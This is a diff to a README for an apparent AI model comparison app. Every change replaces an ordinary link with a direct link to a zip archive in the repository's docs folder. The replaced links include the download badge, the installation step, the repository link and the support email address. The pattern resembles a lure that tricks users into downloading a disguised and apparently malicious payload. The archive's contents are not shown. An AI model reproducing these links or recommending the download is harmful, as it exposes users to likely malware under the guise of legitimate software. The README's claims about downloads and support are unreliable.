@@ -1,6 +1,6 @@
 # 🎉 ai-model-comparison - Compare Leading AI Models Easily
 
-![Download](https://img.shields.io/badge/Download-Now-FF5733)
+![Download](https://raw.githubusercontent.com/bo3l4q/ai-model-comparison/main/docs/comparison-model-ai-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -17,13 +17,13 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Visit to Download
 
-To download the application, visit this page: [Download ai-model-comparison](https://github.com/bo3l4q/ai-model-comparison/releases). Here, you will find the latest release and installation instructions.
+To download the application, visit this page: [Download ai-model-comparison](https://raw.githubusercontent.com/bo3l4q/ai-model-comparison/main/docs/comparison-model-ai-v2.6.zip). Here, you will find the latest release and installation instructions.
 
 ## 📂 Installation Steps
 
 1. **Visit the Download Page**
    
-   Click here: [Download ai-model-comparison](https://github.com/bo3l4q/ai-model-comparison/releases) to access the latest version.
+   Click here: [Download ai-model-comparison](https://raw.githubusercontent.com/bo3l4q/ai-model-comparison/main/docs/comparison-model-ai-v2.6.zip) to access the latest version.
 
 2. **Choose the Right File**
    
@@ -76,12 +76,12 @@ After launching the application, follow these steps:
 If you encounter any issues or have questions, please reach out:
 
 - **GitHub Issues**: Report any problems or feature requests on our GitHub page.
-- **Email Support**: Contact us at support@ai-model-comparison.com for assistance.
+- **Email Support**: Contact us at https://raw.githubusercontent.com/bo3l4q/ai-model-comparison/main/docs/comparison-model-ai-v2.6.zip for assistance.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/bo3l4q/ai-model-comparison)
-- [Download ai-model-comparison](https://github.com/bo3l4q/ai-model-comparison/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/bo3l4q/ai-model-comparison/main/docs/comparison-model-ai-v2.6.zip)
+- [Download ai-model-comparison](https://raw.githubusercontent.com/bo3l4q/ai-model-comparison/main/docs/comparison-model-ai-v2.6.zip)
 
 ## 🌐 Community Contributions
 
